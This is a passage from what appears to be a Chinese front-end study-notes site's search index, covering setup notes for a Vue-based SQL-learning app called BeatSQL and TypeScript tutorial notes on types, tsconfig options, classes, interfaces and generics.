src=\\\"./assets/logo.png\\\" alt=\\\"BeatSQL\\\" class=\\\"logo\\\"> <span class=\\\"title\\\">BeatSQL</span> </a-row> </router-link> </a-col> <a-col flex=\\\"auto\\\"> <a-menu mode=\\\"horizontal\\\" :items=\\\"items\\\" :style=\\\"{ lineHeight: '64px' }\\\" @click=\\\"clickMenu\\\" :selected-keys=\\\"selectedKeys\\\" /> </a-col> </a-row> <div class=\\\"content\\\"> <router-view></router-view> </div> <div class=\\\"footer\\\"> BeatSQL - SQL 自学网站 ©2023 by <a href=\\\"https://github.com/zhf521\\\" target=\\\"_blank\\\">zhf</a> </div> <a-back-top :style=\\\"{ right: '24px' }\\\"></a-back-top> </template> <script setup> import { computed, ref } from 'vue'; import { useRouter, useRoute } from 'vue-router'; const router = useRouter(); const route = useRoute(); const selectedKeys = computed(() => [route.path]) const items = ref([{ key: '/learn', label: '学习', title: '学习', }, { key: '/levels', label: '关卡', title: '关卡', }, { key: '/playground', label: '广场', title: '广场', }]); // 点击菜单触发菜单切换 const clickMenu = ({ item, key, keyPath }) => { router.push(key) }; </script> <style scoped> .header { border-bottom: 1px solid #f0f0f0; padding: 0 24px; } .ant-menu-horizontal { border-bottom: none !important; } .logo { width: 56px; } .title { margin-left: 8px; font-size: 20px; color: #000; } .content { padding: 24px; } .footer { padding: 12px; text-align: center; background: #efefef; } </style> \",\"views/LearnPage.vue\",\"<template> <a-row :gutter=\\\"[16, 16]\\\"> <!-- 左半部分区域 --> <a-col :lg=\\\"11\\\" :xs=\\\"24\\\"> <!-- 问题面板 --> </a-col> <!-- 右半部分区域 --> <a-col :lg=\\\"13\\\" :xs=\\\"24\\\"> <!-- SQL编辑区 --> <!-- 可折叠区域 --> <a-collapse v-model:activeKey=\\\"activeKey\\\" style=\\\"margin-top: 16px;\\\"> <a-collapse-panel key=\\\"result\\\" header=\\\"查看执行结果\\\"> </a-collapse-panel> <a-collapse-panel key=\\\"hint\\\" header=\\\"查看提示\\\"> </a-collapse-panel> <a-collapse-panel key=\\\"ddl\\\" header=\\\"查看建表语句\\\"> </a-collapse-panel> <a-collapse-panel key=\\\"answer\\\" header=\\\"查看答案\\\"> </a-collapse-panel> </a-collapse> </a-col> </a-row> </template> <script setup> import { ref } from 'vue'; const activeKey = ref(['result']); </script> <style></style> \"]},{\"header\":\"7. 引入ByteMD\",\"slug\":\"_7-引入bytemd\",\"contents\":[\"安装\",\"npm i @bytemd/vue-next \",\"使用\",\"它有两个组件 Editor 和 Viewer 这两个，比较通俗易懂， Editor 顾名思义，就是 Markdown 编辑器，viewer 用于显示渲染的 Markdown 结果\",\"import { Editor, Viewer } from '@bytemd/vue-next' \",\"在使用组件之前，请记住导入 CSS 文件以使样式正确\",\"import 'bytemd/dist/index.css' \",\"示例\",\"<template> <Viewer :value=\\\"value\\\" :plugins=\\\"plugins\\\" /> </template> <script setup> import { Viewer } from '@bytemd/vue-next'; // 插件：支持 GFM（自动链接文字、删除线、表格、任务列表） import gfm from '@bytemd/plugin-gfm'; // 插件：支持代码高亮 import heighlight from '@bytemd/plugin-highlight'; import 'highlight.js/styles/default.css'; // 引入github-markdown-css主题 import 'github-markdown-css/github-markdown.css'; import 'bytemd/dist/index.css'; const plugins = [gfm(), heighlight()]; const props = defineProps(['value']); </script> \"]},{\"header\":\"8. 引入github-markdown-css主题\",\"slug\":\"_8-引入github-markdown-css主题\",\"contents\":[\"安装\",\"npm install github-markdown-css \",\"引入\",\"import 'github-markdown-css/github-markdown.css'; \"]},{\"header\":\"9. 引入monaco-editor\",\"slug\":\"_9-引入monaco-editor\",\"contents\":[\"安装\",\"npm install monaco-editor \",\"使用\",\"<template> <div ref=\\\"editorRef\\\" style=\\\" height: 280px;\\\"></div> <a-space :size=\\\"16\\\" style=\\\"margin-top: 16px;\\\"> <a-button type=\\\"primary\\\" style=\\\"width: 180px;\\\">运行</a-button> <a-button>格式化</a-button> <a-button>重置</a-button> </a-space> </template> <script setup> import * as monaco from 'monaco-editor'; import EditorWorker from \\\"monaco-editor/esm/vs/editor/editor.worker?worker\\\"; import { onMounted, onUnmounted, ref, toRaw } from 'vue'; const editorRef = ref(); const inputEditor = ref(); self.MonacoEnvironment = { getWorker() { return new EditorWorker(); } }; onMounted(() => { // 初始化代码编辑器 if (editorRef.value) { const initValue = ''; inputEditor.value = monaco.editor.create(editorRef.value, { value: initValue, language: 'sql', theme: 'vs-dark', formatOnPaste: true, automaticLayout: true, fontSize: 16, minimap: { enabled: false, }, }); } }); // 释放资源 onUnmounted(() => { if (inputEditor.value) { // 注意：应该使用toRaw将响应式对象转换成普通对象，否则会出现内存泄漏 toRaw(inputEditor.value).dispose(); } }); </script> <style></style> \"]},{\"header\":\"10. 引入sql-formatter\",\"slug\":\"_10-引入sql-formatter\",\"contents\":[\"下载\",\"npm i sql-formatter \",\"引入\",\"import { format } from 'sql-formatter'; \"]},{\"header\":\"11. 引入sql.js\",\"slug\":\"_11-引入sql-js\",\"contents\":[\"下载\",\"npm install sql.js \",\"引入\",\"import initSqlJs from \\\"sql.js\\\"; \"]},{\"header\":\"12. pinia持久化存储\",\"slug\":\"_12-pinia持久化存储\",\"contents\":[\"使用pinia-plugin-persistedstate插件实现\",\"下载\",\"npm i pinia-plugin-persistedstate \",\"在入口文件（main.js）中将插件添加到 pinia 实例上\",\"import { createPinia } from 'pinia'; import piniaPluginPersistedstate from 'pinia-plugin-persistedstate'; const pinia = createPinia(); pinia.use(piniaPluginPersistedstate); \",\"在Store中使用\",\"import { defineStore } from 'pinia'; export const useStore = defineStore( 'main', () => { const someState = ref('你好 pinia'); return { someState }; }, { persist: true, } ); \"]},{\"header\":\"13. 项目目录结构\",\"slug\":\"_13-项目目录结构\",\"contents\":[\"public：公共静态资源\",\"src\",\"assets：静态资源\",\"components：组件\",\"CodeEditor.vue：代码编辑器\",\"MdViewer.vue：Markdown 浏览\",\"QuestionBoard.vue：题目面板（教程区）\",\"SQLEditor.vue：SQL 编辑器（练习区）\",\"SQLResult.vue：SQL 执行结果（结果区）\",\"levels：关卡\",\"custom：自定义关卡文件夹\",\"main：主线关卡文件夹\",\"customLevels.js：自定义关卡列表\",\"index.js：定义了关卡相关变量和函数\",\"mainLevels.js：主线关卡列表\",\"router：路由\",\"index.js：路由配置\",\"store\",\"globalStore.js：全局状态管理\",\"utils：核心\",\"sqlExecutor.js：SQL 执行引擎\",\"result.js：SQL执行结果相关变量和函数\",\"views：页面\",\"LearnPage.vue：学习页面\",\"LevelsPage.vue：关卡页面\",\"PlaygroundPage.vue：广场页面\",\"App.vue：主页\",\"main.js：Vue 主文件\"]}]},\"/front-end/project-notes/\":{\"title\":\"项目笔记\",\"contents\":[]},\"/front-end/typescript-notes/01-TypeScript%E7%AE%80%E4%BB%8B.html\":{\"title\":\"简介\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"TypeScript是JavaScript的超集\",\"它对JS进行了扩展，向JS中引入了类型的概念，并添加了许多新的特性\",\"TS代码需要通过编译器编译为JS，然后再交由JS解析器执行\",\"TS完全兼容JS，换言之，任何的JS代码都可以直接当成TS使用\",\"相较于JS而言，TS拥有了静态类型，更加严格的语法，更强大的功能；TS可以在代码执行前就完成代码的检查，减小了运行时异常的出现的几率；TS代码可以编译为任意版本的JS代码，可有效解决不同JS运行环境的兼容问题；同样的功能，TS的代码量要大于JS，但由于TS的代码结构更加清晰，变量类型更加明确，在后期代码的维护中TS却远远胜于JS\"]}]},\"/front-end/typescript-notes/02-TypeScript%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html\":{\"title\":\"开发环境搭建\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"下载安装NodeJS\",\"使用npm全局安装typescript\",\"npm i -g typescript \",\"创建一个ts文件\",\"使用tsc对ts文件进行编译\",\"进入命令行\",\"进入ts文件所在目录\",\"执行命令\",\"tsc xxx.ts \",\"编译完会生成对应的js文件\"]}]},\"/front-end/typescript-notes/03-TypeScript%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B.html\":{\"title\":\"基本类型\",\"contents\":[{\"header\":\"1. 类型声明\",\"slug\":\"_1-类型声明\",\"contents\":[\"类型声明是TS非常重要的一个特点\",\"通过类型声明可以指定TS中变量（参数、形参）的类型\",\"指定类型后，当为变量赋值时，TS编译器会自动检查值是否符合类型声明，符合则赋值，否则报错\",\"简而言之，类型声明给变量设置了类型，使得变量只能存储某种类型的值\"]},{\"header\":\"2. 语法\",\"slug\":\"_2-语法\",\"contents\":[\"let 变量: 类型 let 变量: 类型 = 值 function fn(参数: 类型, 参数: 类型): 类型{ ... } \"]},{\"header\":\"3. 自动类型判断\",\"slug\":\"_3-自动类型判断\",\"contents\":[\"TS拥有自动的类型判断机制\",\"当对变量的声明和赋值是同时进行的，TS编译器会自动判断变量的类型\",\"所以如果你的变量的声明和赋值时同时进行的，可以省略掉类型声明\"]},{\"header\":\"4. 类型\",\"slug\":\"_4-类型\",\"contents\":[\"类型\",\"例子\",\"描述\",\"number\",\"1, -33, 2.5\",\"任意数字\",\"string\",\"'hi', \\\"hi\\\", `hi`\",\"任意字符串\",\"boolean\",\"true、false\",\"布尔值true或false\",\"字面量\",\"其本身\",\"限制变量的值就是该字面量的值\",\"any\",\"*\",\"任意类型\",\"unknown\",\"*\",\"类型安全的any\",\"void\",\"空值（undefined）\",\"没有值（或undefined）\",\"never\",\"没有值\",\"不能是任何值\",\"object\",\"任意的JS对象\",\"array\",\"[1,2,3]\",\"任意JS数组\",\"tuple\",\"[4,5]\",\"元素，TS新增类型，固定长度数组\",\"enum\",\"enum\",\"枚举，TS中新增类型\",\"演示：\",\"number\",\"let decimal: number = 6 let hex: number = 0xf00d let binary: number = 0b1010 let octal: number = 0o744 let big: bigint = 100n \",\"// 声明一个变量a，同时指定它的类型为number let a: number // a的类型设置为了number,在以后的使用过程中a的值只能是数字 a = 10 // a = 'hello' //代码会报错，因为变量a的类型是number，不能赋值字符串 \",\"boolean\",\"let isDone: boolean = false \",\"string\",\"let b: string b = 'hello' // b = 123 //报错 //声明完变量直接进行赋值 // let c:boolean = true // 如果变量的声明和赋值是同时进行的，TS可以自动对变量进行类型检测 \",\"字面量\",\"也可以使用字面量去指定变量的类型，通过字面量可以确定变量的取值范围\",\"let color: 'red' | 'blue' | 'black' let num: 1 | 2 | 3 | 4 | 5 // 可以使用 | 来连接多个类型(联合类型) let c: 'male' | 'female' c = 'male' c = 'female' \",\"any\",\"// any表示的是任意类型，一个变量设置类型为any后相当于对该变量关闭了TS的类型检测 // 使用TS时，不建议使用any类型 // let e: any //声明变量如果不指定类型，则TS解析器会自动判断变量的类型为any（隐式的any） let e e = 10 e = 'hello' \",\"unknown\",\"//unknown 表示未知类型的值 let f: unknown f = 10 f = 'hello' f = true //unknown 实际上就是一个类型安全的any //unknown 类型的变量，不能直接赋值给其它变量 \",\"void\",\"let unusable: void = undefined // void用来表示空，以函数为例，就表示没有返回值的函数 function fn(): void{ // return true } \",\"never\",\"// never表示永远不会返回结果 function fn2(): never{ throw new Error('报错了') } \",\"object\",\"// object表示一个js对象 let a: object /* {}用来指定对象中可以包含哪些属性 语法：{属性:属性值,属性名:属性值} 在属性名后边加上?，表示属性是可选的 */ let b: { name: string, age?: number } b = { name: '孙悟空' } // [propName:string]:any 表示任意类型的属性 let c: { name: string,[propName:string]:any } c={name:'猪八戒',age:18,gender:'男'} /* 设置函数结构的类型声明 语法：(形参:类型,形参:类型)=>返回值 */ let d: (a:number,b:number)=>number // &表示同时 let j: { name: string } & { age: number } j = { name: '孙悟空', age: 18 } \",\"array\",\"/* 数组的类型声明 类型[] Array<类型> */ // string[] 表示字符串数组 let e:string[] e = ['a', 'b', 'c'] // number[] 表示数值数组 let f: number[] f = [1, 2, 3, 4] let g: Array<number> g = [1, 2, 3] \",\"tuple\",\"/* 元组，元组就是固定长度的数组 语法：[类型,类型,类型] */ let h: [string, string] h = ['hello', 'abc'] \",\"enum\",\"/* enum枚举 */ enum Color { Red, Green, Blue, } let c: Color = Color.Green enum Color { Red = 1, Green, Blue, } let c: Color = Color.Green enum Color { Red = 1, Green = 2, Blue = 4, } let c: Color = Color.Green \"]},{\"header\":\"5. 类型断言\",\"slug\":\"_5-类型断言\",\"contents\":[\"有些情况下，变量的类型对于我们来说是很明确，但是TS编译器却并不清楚，此时，可以通过类型断言来告诉编译器变量的类型，断言有两种形式：\",\"第一种\",\"// 变量 as 类型 let s: string let f: unknown s = f as string \",\"第二种\",\"// <类型>变量 let s: string let f: unknown s = <string>f \"]},{\"header\":\"6. 类型的别名\",\"slug\":\"_6-类型的别名\",\"contents\":[\"type myType = 1 | 2 | 3 | 4 | 5 let k: myType let l: myType let m: myType \"]}]},\"/front-end/typescript-notes/04-TypeScript%E7%BC%96%E8%AF%91%E9%80%89%E9%A1%B9.html\":{\"title\":\"编译选项\",\"contents\":[{\"header\":\"1. 自动编译文件\",\"slug\":\"_1-自动编译文件\",\"contents\":[\"编译文件时，使用 -w 指令后，TS编译器会自动监视文件的变化，并在文件发生变化时对文件进行重新编译\",\"示例：\",\"tsc xxx.ts -w \"]},{\"header\":\"2. 自动编译整个项目\",\"slug\":\"_2-自动编译整个项目\",\"contents\":[\"如果直接使用tsc指令，则可以自动将当前项目下的所有ts文件编译为js文件\",\"但是能直接使用tsc命令的前提时，要先在项目根目录下创建一个ts的配置文件 tsconfig.json\",\"文件内容设置为：\",\"{ } \",\"运行tsc指令即可\"]},{\"header\":\"3. tsconfig.json\",\"slug\":\"_3-tsconfig-json\",\"contents\":[\"tsconfig.json是一个JSON文件，添加配置文件后，只需只需 tsc 命令即可完成对整个项目的编译\",\"配置选项：\",\"include\",\"定义希望被编译文件所在的目录\",\"默认值：[\\\"**/*\\\"]\",\"示例：\",\"/* 路径：** 表示任意目录 * 表示任意文件 */ \\\"include\\\":[\\\"src/**/*\\\", \\\"tests/**/*\\\"] \",\"上述示例中，所有src目录和tests目录下的文件都会被编译\",\"exclude\",\"定义需要排除在外的目录\",\"默认值：[\\\"node_modules\\\", \\\"bower_components\\\", \\\"jspm_packages\\\"]\",\"示例：\",\"\\\"exclude\\\": [\\\"./src/hello/**/*\\\"] \",\"上述示例中，src下hello目录下的文件都不会被编译\",\"extends\",\"定义被继承的配置文件\",\"示例：\",\"\\\"extends\\\": \\\"./configs/base\\\" \",\"上述示例中，当前配置文件中会自动包含configs目录下base.json中的所有配置信息\",\"files\",\"指定被编译文件的列表，只有需要编译的文件少时才会用到\",\"示例：\",\"\\\"files\\\": [ \\\"core.ts\\\", \\\"sys.ts\\\", \\\"types.ts\\\", \\\"scanner.ts\\\", \\\"parser.ts\\\", \\\"utilities.ts\\\", \\\"binder.ts\\\", \\\"checker.ts\\\", \\\"tsc.ts\\\" ] \",\"上述示例中，列表中的文件都会被TS编译器所编译\",\"compilerOptions\",\"编译选项是配置文件中非常重要也比较复杂的配置选项\",\"在compilerOptions中包含多个子选项，用来完成对编译的配置\",\"target\",\"设置ts代码编译的目标版本\",\"可选值：\",\"ES3（默认）、ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"target\\\": \\\"ES6\\\" } \",\"如上设置，我们所编写的ts代码将会被编译为ES6版本的js代码\",\"lib\",\"指定代码运行时所包含的库（宿主环境）\",\"可选值：\",\"ES5、ES6/ES2015、ES7/ES2016、ES2017、ES2018、ES2019、ES2020、ESNext、DOM、WebWorker、ScriptHost ......\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"target\\\": \\\"ES6\\\", \\\"lib\\\": [\\\"ES6\\\", \\\"DOM\\\"], \\\"outDir\\\": \\\"dist\\\", \\\"outFile\\\": \\\"dist/aa.js\\\" } \",\"module\",\"设置编译后代码使用的模块化系统\",\"可选值：\",\"CommonJS、UMD、AMD、System、ES2020、ESNext、None\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"module\\\": \\\"CommonJS\\\" } \",\"outDir\",\"编译后文件的所在目录\",\"默认情况下，编译后的js文件会和ts文件位于相同的目录，设置outDir后可以改变编译后文件的位置\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"outDir\\\": \\\"dist\\\" } \",\"设置后编译后的js文件将会生成到dist目录\",\"outFile\",\"将所有的文件编译为一个js文件\",\"默认会将所有的编写在全局作用域中的代码合并为一个js文件，如果module制定了None、System或AMD则会将模块一起合并到文件之中\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"outFile\\\": \\\"dist/app.js\\\" } \",\"rootDir\",\"指定代码的根目录，默认情况下编译后文件的目录结构会以最长的公共目录为根目录，通过rootDir可以手动指定根目录\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"rootDir\\\": \\\"./src\\\" } \",\"allowJs\",\"是否对js文件编译\",\"checkJs\",\"是否对js文件进行检查\",\"示例：\",\"\\\"compilerOptions\\\": { \\\"allowJs\\\": true, \\\"checkJs\\\": true } \",\"removeComments\",\"是否删除注释\",\"默认值：false\",\"noEmit\",\"不对代码进行编译\",\"默认值：false\",\"sourceMap\",\"是否生成sourceMap\",\"默认值：false\",\"严格检查\",\"strict \",\"启用所有的严格检查，默认值为true，设置后相当于开启了所有的严格检查\",\"alwaysStrict \",\"总是以严格模式对代码进行编译\",\"noImplicitAny \",\"禁止隐式的any类型\",\"noImplicitThis \",\"禁止类型不明确的this\",\"strictBindCallApply \",\"严格检查bind、call和apply的参数列表\",\"strictFunctionTypes \",\"严格检查函数的类型\",\"strictNullChecks \",\"严格的空值检查\",\"strictPropertyInitialization \",\"严格检查属性是否初始化\",\"额外检查\",\"noFallthroughCasesInSwitch \",\"检查switch语句包含正确的break\",\"noImplicitReturns \",\"检查函数没有隐式的返回值\",\"noUnusedLocals \",\"检查未使用的局部变量\",\"noUnusedParameters \",\"检查未使用的参数\",\"高级\",\"allowUnreachableCode \",\"检查不可达代码\",\"可选值： \",\"true，忽略不可达代码\",\"false，不可达代码将引起错误\",\"noEmitOnError \",\"有错误的情况下不进行编译\",\"默认值：false\"]}]},\"/front-end/typescript-notes/05-TypeScript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html\":{\"title\":\"面向对象\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"面向对象是程序中一个非常重要的思想，它被很多同学理解成了一个比较难、比较深奥的问题，其实不然\",\"面向对象很简单，简而言之就是程序之中所有的操作都需要通过对象来完成\",\"举例来说：\",\"操作浏览器要使用window对象\",\"操作网页要使用document对象\",\"操作控制台要使用console对象\",\"一切操作都要通过对象，也就是所谓的面向对象，那么对象到底是什么呢？\",\"这就要先说到程序是什么，计算机程序的本质就是对现实事物的抽象，抽象的反义词是具体，比如：照片是对一个具体的人的抽象，汽车模型是对具体汽车的抽象等等。程序也是对事物的抽象，在程序中我们可以表示一个人、一条狗、一把枪、一颗子弹等等所有的事物。一个事物到了程序中就变成了一个对象\",\"在程序中所有的对象都被分成了两个部分：数据和功能。以人为例，人的姓名、性别、年龄、身高、体重等属于数据，人可以说话、走路、吃饭、睡觉这些属于人的功能。数据在对象中被称为属性，而功能就被称为方法。所以简而言之，在程序中一切皆是对象\"]},{\"header\":\"1. 类（class）\",\"slug\":\"_1-类-class\",\"contents\":[\"要想面向对象，操作对象，首先便要拥有对象，那么下一个问题就是如何创建对象\",\"要创建对象，必须要先定义类，所谓的类可以理解为对象的模型，程序中可以根据类创建指定类型的对象，举例来说：可以通过Person类来创建人的对象，通过Dog类创建狗的对象，通过Car类来创建汽车的对象，不同的类可以用来创建不同的对象\",\"定义类：\",\"// 使用class关键字来定义一个类 // 对象中主要包含属性和方法 class 类名 { // readonly开头的属性表示只读属性，无法修改 // 定义实例属性（需要通过对象的实例去访问） 属性名: 类型 = 属性值 // 在属性前使用static关键字可以定义类属性（静态属性）（可以直接通过类去访问） static 属性名: 类型 = 属性值 // 定义方法 // 如果方法以static开头则方法就是类方法，可以直接通过类调用 方法名(){ .... } } \",\"示例：\",\"class Person{ name: string = \\\"孙悟空\\\" age: number = 18 sayHello(){ console.log('大家好，我是孙悟空') } } \",\"使用类：\",\"const p = new Person() p.sayHello() \"]},{\"header\":\"2. 构造函数和this\",\"slug\":\"_2-构造函数和this\",\"contents\":[\"我们来创建Dog类：\",\"class Dog{ name = '旺财' age = 3 bark() { alert('汪汪汪！') } } const dog = new Dog() const dog2 = new Dog() console.log(dog) console.log(dog2) \",\"这样就有一个问题，每一个dog都叫旺财，并且年龄都是3岁了\",\"这就需要构造函数了\",\"class Dog{ name: string age: number // constructor 被称为构造函数 // 构造函数会在对象创建时调用 constructor(name:string,age:number) { // 在实例方法中，this就表示当前的实例 // 在构造函数中当前对象就是当前新建的那个对象 // 可以通过this向新建的对象中添加属性 this.name = name this.age = age } bark() { alert('汪汪汪！') } } const dog = new Dog('小白',4) const dog2 = new Dog('大黄', 5) \"]},{\"header\":\"3. 面向对象的特点\",\"slug\":\"_3-面向对象的特点\",\"contents\":[]},{\"header\":\"3.1 封装\",\"slug\":\"_3-1-封装\",\"contents\":[\"对象实质上就是属性和方法的容器，它的主要作用就是存储属性和方法，这就是所谓的封装\",\"默认情况下，对象的属性是可以任意的修改的，为了确保数据的安全性，在TS中可以对属性的权限进行设置\",\"只读属性（readonly）：如果在声明属性时添加一个readonly，则属性便成了只读属性无法修改\",\"TS中属性具有三种修饰符：\",\"public（默认值），可以在类、子类和对象中修改\",\"protected ，可以在类、子类中修改\",\"private ，可以在类中修改\",\"示例：\",\"public\",\"class Person{ public name: string // 写或什么都不写都是public public age: number constructor(name: string, age: number){ this.name = name // 可以在类中修改 this.age = age } sayHello(){ console.log(`大家好，我是${this.name}`) } } class Employee extends Person{ constructor(name: string, age: number){ super(name, age) this.name = name //子类中可以修改 } } const p = new Person('孙悟空', 18) p.name = '猪八戒'// 可以通过对象修改 \",\"protected\",\"class Person{ protected name: string protected age: number constructor(name: string, age: number){ this.name = name // 可以修改 this.age = age } sayHello(){ console.log(`大家好，我是${this.name}`) } } class Employee extends Person{ constructor(name: string, age: number){ super(name, age) this.name = name //子类中可以修改 } } const p = new Person('孙悟空', 18) p.name = '猪八戒' // 不能修改 \",\"private\",\"class Person{ private name: string private age: number constructor(name: string, age: number){ this.name = name // 可以修改 this.age = age } sayHello(){ console.log(`大家好，我是${this.name}`) } } class Employee extends Person{ constructor(name: string, age: number){ super(name, age) this.name = name //子类中不能修改 } } const p = new Person('孙悟空', 18) p.name = '猪八戒' // 不能修改 \",\"属性存取器：\",\"对于一些不希望被任意修改的属性，可以将其设置为private\",\"直接将其设置为private将导致无法再通过对象修改其中的属性\",\"我们可以在类中定义一组读取、设置属性的方法，这种对属性读取或设置的属性被称为属性的存取器\",\"读取属性的方法叫做setter方法，设置属性的方法叫做getter方法\",\"示例：\",\"class Person{ private _name: string constructor(name: string){ this._name = name } get name(){ return this._name } set name(name: string){ this._name = name } } const p1 = new Person('孙悟空') console.log(p1.name) // 通过getter读取name属性 p1.name = '猪八戒' // 通过setter修改name属性 \",\"静态属性：\",\"静态属性（方法），也称为类属性。使用静态属性无需创建实例，通过类即可直接使用\",\"静态属性（方法）使用static开头\",\"示例：\",\"class Tools{ static PI = 3.1415926 static sum(num1: number, num2: number){ return num1 + num2 } } console.log(Tools.PI) console.log(Tools.sum(123, 456)) \"]},{\"header\":\"3.2 继承\",\"slug\":\"_3-2-继承\",\"contents\":[\"继承是面向对象中的又一个特性\",\"通过继承可以将其他类中的属性和方法引入到当前类中\",\"示例：\",\"class Animal{ name: string age: number constructor(name: string, age: number){ this.name = name this.age = age } } class Dog extends Animal{ bark() console.log(`${this.name}在汪汪叫！`) } } const dog = new Dog('旺财', 4) dog.bark() \",\"通过继承可以在不修改类的情况下完成对类的扩展\",\"重写：\",\"发生继承时，子类中的方法会替换掉父类中的同名方法，这就称为方法的重写\",\"示例：\",\"class Animal{ name: string age: number constructor(name: string, age: number){ this.name = name this.age = age } run(){ console.log(`父类中的run方法！`) } } class Dog extends Animal{ bark(){ console.log(`${this.name}在汪汪叫！`) } run(){ console.log(`子类中的run方法，会重写父类中的run方法！`) } } const dog = new Dog('旺财', 4) dog.bark() \",\"在子类中可以使用super来完成对父类的引用\",\"class Animal{ name: string age: number constructor(name: string, age: number){ this.name = name this.age = age } sayHello(){ console.log(`动物在叫`) } } class Dog extends Animal{ height:number constructor(name: string, age: number, height:number){ // 如果子类中写了构造函数，在子类构造函数中必须对父类的构造函数进行调用 super(name, age) this.height = height } bark(){ console.log(`${this.name}在汪汪叫！`) } sayHello(){ // 在类的方法中super就表示当前类的父类 // super.sayHello() super.sayHello() } } const dog = new Dog('旺财', 4, 100) dog.sayHello() \",\"抽象类（abstract class）：\",\"抽象类是专门用来被其他类所继承的类，它只能被其他类所继承不能用来创建实例\",\"// 以abstract开头的类是抽象类 // 抽象类和其他类区别不大，只是不能用来创建对象 // 抽象类就是专门用来被继承的类 // 抽象类中可以添加抽象方法 abstract class Animal{ // 定义一个抽象方法 // 抽象方法使用abstract开头，没有方法体 // 抽象方法只能定义在抽象类中，子类必须对抽象方法进行重写 abstract run(): void bark(){ console.log('动物在叫~') } } class Dog extends Animals{ run(){ console.log('狗在跑~') } } \",\"使用abstract开头的方法叫做抽象方法，抽象方法没有方法体只能定义在抽象类中，继承抽象类时抽象方法必须要实现\"]},{\"header\":\"4. 接口（Interface）\",\"slug\":\"_4-接口-interface\",\"contents\":[\"接口的作用类似于抽象类，不同点在于接口中的所有方法和属性都是没有实值的，换句话说接口中的所有方法都是抽象方法。接口主要负责定义一个类的结构，接口可以去限制一个对象的接口，对象只有包含接口中定义的所有属性和方法时才能匹配接口。同时，可以让一个类去实现接口，实现接口时类中要保护接口中的所有属性\",\"// 描述一个对象的类型 type myType = { name: string age: number sayHello():void } // 接口用来定义一个类结构，用来定义一个类中应该包含哪些属性和方法 // 同时接口也可以当成类型声明去使用 // 接口可以在定义类的时候去限制类的结构 // 接口中的所有的属性都不能有实际的值 // 接口只定义对象的结构，而不考虑实际值 // 在接口中所有的方法都是抽象方法 interface myInterface{ name: string age: number sayHello():void } // 定义类时，可以使类去实现一个接口 // 实现接口就是使类满足接口的要求 class MyClass implements myInterface{ name:string constructor(name:string){ this.name = name } sayHello(){ console.log('大家好~~') } } \",\"示例：\",\"interface Person{ name: string sayHello():void } class Student implements Person{ constructor(public name: string) { } sayHello() { console.log('大家好，我是'+this.name) } } \"]},{\"header\":\"5. 泛型（Generic）\",\"slug\":\"_5-泛型-generic\",\"contents\":[\"定义一个函数或类时，有些情况下无法确定其中要使用的具体类型（返回值、参数、属性的类型不能确定），此时泛型便能够发挥作用\",\"举个例子：\",\"function test(arg: any): any{ return arg } \",\"上例中，test函数有一个参数类型不确定，但是能确定的时其返回值的类型和参数的类型是相同的，由于类型不确定所以参数和返回值均使用了any，但是很明显这样做是不合适的，首先使用any会关闭TS的类型检查，其次这样设置也不能体现出参数和返回值是相同的类型\",\"使用泛型：\",\"function test<T>(arg: T): T{ return arg } \",\"这里的<T>就是泛型，T是我们给这个类型起的名字（不一定非叫T），设置泛型后即可在函数中使用T来表示该类型。所以泛型其实很好理解，就表示某个类型\",\"那么如何使用上边的函数呢？\",\"方式一（直接使用）：\",\"使用时可以直接传递参数使用，类型会由TS自动推断出来，但有时编译器无法自动推断时还需要使用下面的方式\",\"test(10) \",\"方式二（指定类型）：\",\"可以在函数后手动指定泛型\",\"test<number>(10) \",\"可以同时指定多个泛型，泛型间使用逗号隔开：\",\"function test<T, K>(a: T, b: K): K{ return b } test<number, string>(10, \\\"hello\\\") \",\"使用泛型时，完全可以将泛型当成是一个普通的类去使用\",\"类中同样可以使用泛型：\",\"class MyClass<T>{ prop: T constructor(prop: T){ this.prop = prop } } \",\"除此之外，也可以对泛型的范围进行约束\",\"interface MyInter{ length: number } function test<T extends MyInter>(arg: T): number{ return arg.length } \",\"使用T extends MyInter表示泛型T必须是MyInter的子类，不一定非要使用接口，类和抽象类同样适用\"]}]},\"/front-end/typescript-notes/\":{\"title\":\"TypeScript笔记\",\"contents\":[]},\"/front-end/vue-notes/01-Vue%E6%A0%B8%E5%BF%83-%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B.html\":{\"title\":\"快速上手\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/01-Vue核心-快速上手\"]},{\"header\":\"1. Vue简介\",\"slug\":\"_1-vue简介\",\"contents\":[]},{\"header\":\"1.1 官网\",\"slug\":\"_1-1-官网\",\"contents\":[\"英文官网\",\"中文官网\"]},{\"header\":\"1.2 介绍与描述\",\"slug\":\"_1-2-介绍与描述\",\"contents\":[\"Vue 是一套用来动态构建用户界面的渐进式 JavaScript 框架 \",\"构建用户界面：把数据通过某种办法变成用户界面\",\"渐进式：Vue 可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心库，复杂应用可以引入各式各样的 Vue 插件\",\"作者 \",\"尤雨溪\"]},{\"header\":\"1.3 Vue的特点\",\"slug\":\"_1-3-vue的特点\",\"contents\":[\"遵循 MVVM 模式\",\"编码简洁，体积小，运行效率高，适合移动/PC 端开发\",\"它本身只关注 UI，可以引入其它第三方库开发项目\",\"采用组件化模式，提高代码复用率、且让代码更好维护\",\"声明式编码，让编码人员无需直接操作 DOM，提高开发效率\",\"使用虚拟 DOM 和 Diff 算法，尽量复用 DOM 节点\"]},{\"header\":\"1.4 与其他 JS 框架的关联\",\"slug\":\"_1-4-与其他-js-框架的关联\",\"contents\":[\"借鉴 angular 的模板和数据绑定技术\",\"借鉴 react 的组件化和虚拟 DOM 技术\"]},{\"header\":\"1.5 